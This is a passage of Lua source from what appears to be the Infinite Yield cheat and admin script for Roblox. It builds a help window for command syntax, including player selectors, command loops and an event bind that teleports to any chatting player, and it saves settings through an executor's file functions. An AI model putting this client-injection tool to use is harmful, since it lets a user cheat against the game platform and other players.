				{53,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={51},Position=UDim2.new(0,71,0,0),Size=UDim2.new(1,0,1,0),Text="- includes anyone below or at the given age",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{54,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{55,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={54},Size=UDim2.new(1,0,1,0),Text="rad[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{56,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={54},Position=UDim2.new(0,70,0,0),Size=UDim2.new(1,0,1,0),Text="- includes anyone within the given radius",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{57,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{58,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={57},Size=UDim2.new(1,0,1,0),Text="nearest",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{59,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={57},Position=UDim2.new(0,43,0,0),Size=UDim2.new(1,0,1,0),Text="- gets the closest player to you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{60,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{61,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={60},Size=UDim2.new(1,0,1,0),Text="farthest",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{62,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={60},Position=UDim2.new(0,46,0,0),Size=UDim2.new(1,0,1,0),Text="- gets the farthest player from you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{63,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{64,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={63},Size=UDim2.new(1,0,1,0),Text="group[ID]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{65,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={63},Position=UDim2.new(0,55,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are in a certain group",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{66,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{67,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={66},Size=UDim2.new(1,0,1,0),Text="alive",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{68,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={66},Position=UDim2.new(0,27,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are alive",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{69,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{70,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={69},Size=UDim2.new(1,0,1,0),Text="dead",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{71,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={69},Position=UDim2.new(0,29,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are dead",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{72,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,LayoutOrder=-1,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{73,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={72},Size=UDim2.new(1,0,1,0),Text="@username",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{74,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={72},Position=UDim2.new(0,66,0,0),Size=UDim2.new(1,0,1,0),Text="- searches for players by username only (ignores displaynames)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{75,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,180),ZIndex=10,}},
				{76,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={75},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Various Operators",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
				{77,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={75},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
				{78,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={75},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,16),Text="Use commas to separate multiple expressions:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{79,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={75},Position=UDim2.new(0,8,0,75),Size=UDim2.new(1,-8,0,16),Text="Use - to exclude, and + to include players in your expression:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{80,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={75},Position=UDim2.new(0,8,0,91),Size=UDim2.new(1,-8,0,16),Text=";locate %blue-friends (gets players in blue team who aren't your friends)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{81,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={75},Position=UDim2.new(0,8,0,46),Size=UDim2.new(1,-8,0,16),Text=";locate noob,noob2,bob",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{82,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={75},Position=UDim2.new(0,8,0,120),Size=UDim2.new(1,-8,0,16),Text="Put ! before a command to run it with the last arguments it was ran with:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{83,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={75},Position=UDim2.new(0,8,0,136),Size=UDim2.new(1,-8,0,32),Text="After running ;offset 0 100 0,  you can run !offset anytime to repeat that command with the same arguments that were used to run it last time",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{84,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,154),ZIndex=10,}},
				{85,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={84},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Command Looping",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
				{86,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={84},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,20),Text="Form: [How many times it loops]^[delay (optional)]^[command]",TextColor3=Color3.new(1,1,1),TextSize=15,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{87,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={84},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
				{88,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={84},Position=UDim2.new(0,8,0,50),Size=UDim2.new(1,-8,0,20),Text="Use the 'breakloops' command to stop all running loops.",TextColor3=Color3.new(1,1,1),TextSize=15,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{89,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={84},Position=UDim2.new(0,8,0,80),Size=UDim2.new(1,-8,0,16),Text="Examples:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{90,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={84},Position=UDim2.new(0,8,0,98),Size=UDim2.new(1,-8,0,42),Text=";5^btools - gives you 5 sets of btools\n;10^3^drophats - drops your hats every 3 seconds 10 times\n;inf^0.1^animspeed 100 - infinitely loops your animation speed to 100",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{91,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,120),ZIndex=10,}},
				{92,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={91},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Execute Multiple Commands at Once",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
				{93,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={91},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,20),Text="You can execute multiple commands at once using \"\\\"",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{94,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={91},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
				{95,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={91},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,-8,0,16),Text="Examples:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{96,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={91},Position=UDim2.new(0,8,0,78),Size=UDim2.new(1,-8,0,32),Text=";drophats\\respawn - drops your hats and respawns you\n;enable inventory\\enable playerlist\\refresh - enables those coregui items and refreshes you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{97,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,75),ZIndex=10,}},
				{98,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={97},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Browse Command History",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
				{99,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={97},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="While focused on the command bar, you can use the up and down arrow keys to browse recently used commands",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{100,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={97},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
				{101,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,75),ZIndex=10,}},
				{102,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={101},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Autocomplete in the Command Bar",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
				{103,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={101},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="While focused on the command bar, you can use the tab key to insert the top suggested command into the command bar.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{104,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={101},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
				{105,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,175),ZIndex=10,}},
				{106,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={105},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Using Event Binds",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
				{107,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={105},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="Use event binds to set up commands that get executed when certain events happen. You can edit the conditions for an event command to run (such as which player triggers it).",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{108,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={105},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
				{109,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={105},Position=UDim2.new(0,8,0,70),Size=UDim2.new(1,-8,0,48),Text="Some events may send arguments; you can use them in your event command by using $ followed by the argument number ($1, $2, etc). You can find out the order and types of these arguments by looking at the settings of the event command.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{110,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={105},Position=UDim2.new(0,8,0,130),Size=UDim2.new(1,-8,0,16),Text="Example:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{111,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={105},Position=UDim2.new(0,8,0,148),Size=UDim2.new(1,-8,0,16),Text="Setting up 'goto $1' on the OnChatted event will teleport you to any player that chats.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
				{112,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,105),ZIndex=10,}},
				{113,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={112},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Get Further Help",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
				{114,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={112},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="You can join the Discord server to get support with IY,  and read up on more documentation such as the Plugin API.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{115,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={112},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),Visible=false,ZIndex=10,}},
				{116,"TextButton",{BackgroundColor3=Color3.new(0.48627451062202,0.61960786581039,0.85098040103912),BorderColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),Font=4,Name="InviteButton",Parent={112},Position=UDim2.new(0,5,0,75),Size=UDim2.new(1,-10,0,25),Text="Copy Discord Invite Link (https://discord.gg/78ZuWSq)",TextColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),TextSize=16,ZIndex=10,}},
			})
			for i,v in pairs(main.Content.List:GetDescendants()) do
				if v:IsA("TextLabel") then
					table.insert(text1,v)
				end
			end
			table.insert(scroll,main.Content.List)
			table.insert(shade1,main.Content)
			table.insert(shade2,main.TopBar)
			main.Name = randomString()
			main.TopBar.Close.MouseButton1Click:Connect(function()
				main:TweenPosition(UDim2.new(0.5,-250,0,-500), "InOut", "Quart", 0.5, true, nil)
			end)
			local inviteButton = main:FindFirstChild("InviteButton",true)
			local lastPress = nil
			inviteButton.MouseButton1Click:Connect(function()
				if everyClipboard then
					toClipboard("https://discord.gg/78ZuWSq")
					inviteButton.Text = "Copied"
				else
					inviteButton.Text = "No Clipboard Function, type out the link"
				end
				local pressTime = tick()
				lastPress = pressTime
				wait(2)
				if lastPress ~= pressTime then return end
				inviteButton.Text = "Copy Discord Invite Link (https://discord.gg/78ZuWSq)"
			end)
			dragGUI(main)
			main.Parent = ScaledHolder
	
			ReferenceButton.MouseButton1Click:Connect(function()
				main:TweenPosition(UDim2.new(0.5,-250,0.5,-150), "InOut", "Quart", 0.5, true, nil)
			end)
		end)()
	
		currentShade1 = Color3.fromRGB(36, 36, 37)
		currentShade2 = Color3.fromRGB(46, 46, 47)
		currentShade3 = Color3.fromRGB(78, 78, 79)
		currentText1 = Color3.new(1, 1, 1)
		currentText2 = Color3.new(0, 0, 0)
		currentScroll = Color3.fromRGB(78,78,79)
	
		defaultGuiScale = IsOnMobile and 0.9 or 1
		defaultsettings = {
			prefix = ';';
			StayOpen = false;
			guiScale = defaultGuiScale;
			espTransparency = 0.3;
			keepIY = true;
			logsEnabled = false;
			jLogsEnabled = false;
			aliases = {};
			binds = {};
			WayPoints = {};
			PluginsTable = {};
			currentShade1 = {currentShade1.R,currentShade1.G,currentShade1.B};
			currentShade2 = {currentShade2.R,currentShade2.G,currentShade2.B};
			currentShade3 = {currentShade3.R,currentShade3.G,currentShade3.B};
			currentText1 = {currentText1.R,currentText1.G,currentText1.B};
			currentText2 = {currentText2.R,currentText2.G,currentText2.B};
			currentScroll = {currentScroll.R,currentScroll.G,currentScroll.B};
			eventBinds = eventEditor.SaveData()
		}
	
		defaults = HttpService:JSONEncode(defaultsettings)
		nosaves = false
		useFactorySettings = function()
			prefix = ';'
			StayOpen = false
			guiScale = defaultGuiScale
			KeepInfYield = true
			espTransparency = 0.3
			logsEnabled = false
			jLogsEnabled = false
			logsWebhook = nil
			aliases = {}
			binds = {}
			WayPoints = {}
			PluginsTable = {}
		end
	
		createPopup = function(text)
			local FileError = Instance.new("Frame")
			local background = Instance.new("Frame")
			local Directions = Instance.new("TextLabel")
			local shadow = Instance.new("Frame")
			local PopupText = Instance.new("TextLabel")
			local Exit = Instance.new("TextButton")
			local ExitImage = Instance.new("ImageLabel")
	
			FileError.Name = randomString()
			FileError.Parent = ScaledHolder
			FileError.Active = true
			FileError.BackgroundTransparency = 1
			FileError.Position = UDim2.new(0.5, -180, 0, 290)
			FileError.Size = UDim2.new(0, 360, 0, 20)
			FileError.ZIndex = 10
	
			background.Name = "background"
			background.Parent = FileError
			background.Active = true
			background.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
			background.BorderSizePixel = 0
			background.Position = UDim2.new(0, 0, 0, 20)
			background.Size = UDim2.new(0, 360, 0, 205)
			background.ZIndex = 10
	
			Directions.Name = "Directions"
			Directions.Parent = background
			Directions.BackgroundTransparency = 1
			Directions.BorderSizePixel = 0
			Directions.Position = UDim2.new(0, 10, 0, 10)
			Directions.Size = UDim2.new(0, 340, 0, 185)
			Directions.Font = Enum.Font.SourceSans
			Directions.TextSize = 14
			Directions.Text = text
			Directions.TextColor3 = Color3.new(1, 1, 1)
			Directions.TextWrapped = true
			Directions.TextXAlignment = Enum.TextXAlignment.Left
			Directions.TextYAlignment = Enum.TextYAlignment.Top
			Directions.ZIndex = 10
	
			shadow.Name = "shadow"
			shadow.Parent = FileError
			shadow.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
			shadow.BorderSizePixel = 0
			shadow.Size = UDim2.new(0, 360, 0, 20)
			shadow.ZIndex = 10
	
			PopupText.Name = "PopupText"
			PopupText.Parent = shadow
			PopupText.BackgroundTransparency = 1
			PopupText.Size = UDim2.new(1, 0, 0.95, 0)
			PopupText.ZIndex = 10
			PopupText.Font = Enum.Font.SourceSans
			PopupText.TextSize = 14
			PopupText.Text = "File Error"
			PopupText.TextColor3 = Color3.new(1, 1, 1)
			PopupText.TextWrapped = true
	
			Exit.Name = "Exit"
			Exit.Parent = shadow
			Exit.BackgroundTransparency = 1
			Exit.Position = UDim2.new(1, -20, 0, 0)
			Exit.Size = UDim2.new(0, 20, 0, 20)
			Exit.Text = ""
			Exit.ZIndex = 10
	
			ExitImage.Parent = Exit
			ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
			ExitImage.BackgroundTransparency = 1
			ExitImage.Position = UDim2.new(0, 5, 0, 5)
			ExitImage.Size = UDim2.new(0, 10, 0, 10)
			ExitImage.Image = getcustomasset("infiniteyield/assets/close.png")
			ExitImage.ZIndex = 10
	
			Exit.MouseButton1Click:Connect(function()
				FileError:Destroy()
			end)
		end
	
		local loadedEventData = nil
		local jsonAttempts = 0
		function saves()
			if writefileExploit() and readfileExploit() and jsonAttempts < 10 then
				local readSuccess, out = readfile("IY_FE.iy", true)
				if readSuccess then
					if out ~= nil and tostring(out):gsub("%s", "") ~= "" then
						local success, response = pcall(function()
							local json = HttpService:JSONDecode(out)
							if vtype(json.prefix, "string") then prefix = json.prefix else prefix = ';' end
							if vtype(json.StayOpen, "boolean") then StayOpen = json.StayOpen else StayOpen = false end
							if vtype(json.guiScale, "number") then guiScale = json.guiScale else guiScale = defaultGuiScale end
							if vtype(json.keepIY, "boolean") then KeepInfYield = json.keepIY else KeepInfYield = true end
							if vtype(json.espTransparency, "number") then espTransparency = json.espTransparency else espTransparency = 0.3 end
							if vtype(json.logsEnabled, "boolean") then logsEnabled = json.logsEnabled else logsEnabled = false end
							if vtype(json.jLogsEnabled, "boolean") then jLogsEnabled = json.jLogsEnabled else jLogsEnabled = false end
							if vtype(json.logsWebhook, "string") then logsWebhook = json.logsWebhook else logsWebhook = nil end
							if vtype(json.aliases, "table") then aliases = json.aliases else aliases = {} end
							if vtype(json.binds, "table") then binds = json.binds else binds = {} end
							if vtype(json.spawnCmds, "table") then spawnCmds = json.spawnCmds end
							if vtype(json.WayPoints, "table") then AllWaypoints = json.WayPoints else WayPoints = {} AllWaypoints = {} end
							if vtype(json.PluginsTable, "table") then PluginsTable = json.PluginsTable else PluginsTable = {} end
							if vtype(json.currentShade1, "table") then currentShade1 = Color3.new(json.currentShade1[1],json.currentShade1[2],json.currentShade1[3]) end
							if vtype(json.currentShade2, "table") then currentShade2 = Color3.new(json.currentShade2[1],json.currentShade2[2],json.currentShade2[3]) end
							if vtype(json.currentShade3, "table") then currentShade3 = Color3.new(json.currentShade3[1],json.currentShade3[2],json.currentShade3[3]) end
							if vtype(json.currentText1, "table") then currentText1 = Color3.new(json.currentText1[1],json.currentText1[2],json.currentText1[3]) end
							if vtype(json.currentText2, "table") then currentText2 = Color3.new(json.currentText2[1],json.currentText2[2],json.currentText2[3]) end
							if vtype(json.currentScroll, "table") then currentScroll = Color3.new(json.currentScroll[1],json.currentScroll[2],json.currentScroll[3]) end
							if vtype(json.eventBinds, "string") then loadedEventData = json.eventBinds end
						end)
						if not success then
							jsonAttempts = jsonAttempts + 1
							warn("Save Json Error:", response)
							warn("Overwriting Save File")
							writefile("IY_FE.iy", defaults, true)
							wait()
							saves()
						end
					else
						writefile("IY_FE.iy", defaults, true)
						wait()
						local dReadSuccess, dOut = readfile("IY_FE.iy", true)
						if dReadSuccess and dOut ~= nil and tostring(dOut):gsub("%s", "") ~= "" then
							saves()
						else
							nosaves = true
							useFactorySettings()
							createPopup("There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile/readfile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again.")
						end
					end
				else
					writefile("IY_FE.iy", defaults, true)
					wait()
					local dReadSuccess, dOut = readfile("IY_FE.iy", true)
					if dReadSuccess and dOut ~= nil and tostring(dOut):gsub("%s", "") ~= "" then
						saves()
					else
						nosaves = true
						useFactorySettings()
						createPopup("There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile/readfile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again.")
					end
				end
			else
				if jsonAttempts >= 10 then
					nosaves = true
					useFactorySettings()
					createPopup("Sorry, we have attempted to parse your save file, but it is unreadable!\n\nInfinite Yield is now using factory settings until your exploit's file system works.\n\nYour save file has not been deleted.")
				else
					nosaves = true
					useFactorySettings()
				end
			end
		end
	
		saves()
	
		function updatesaves()
			if nosaves == false and writefileExploit() then
				local update = {
					prefix = prefix;
					StayOpen = StayOpen;
					guiScale = guiScale;
					keepIY = KeepInfYield;
					espTransparency = espTransparency;
					logsEnabled = logsEnabled;
					jLogsEnabled = jLogsEnabled;
					logsWebhook = logsWebhook;
					aliases = aliases;
					binds = binds or {};
					WayPoints = AllWaypoints;
					PluginsTable = PluginsTable;
					currentShade1 = {currentShade1.R,currentShade1.G,currentShade1.B};
					currentShade2 = {currentShade2.R,currentShade2.G,currentShade2.B};
					currentShade3 = {currentShade3.R,currentShade3.G,currentShade3.B};
					currentText1 = {currentText1.R,currentText1.G,currentText1.B};
					currentText2 = {currentText2.R,currentText2.G,currentText2.B};
					currentScroll = {currentScroll.R,currentScroll.G,currentScroll.B};
					eventBinds = eventEditor.SaveData()
				}
				writefileCooldown("IY_FE.iy", HttpService:JSONEncode(update))
			end
		end
	
		eventEditor.SetOnEdited(updatesaves)
	
		pWayPoints = {}
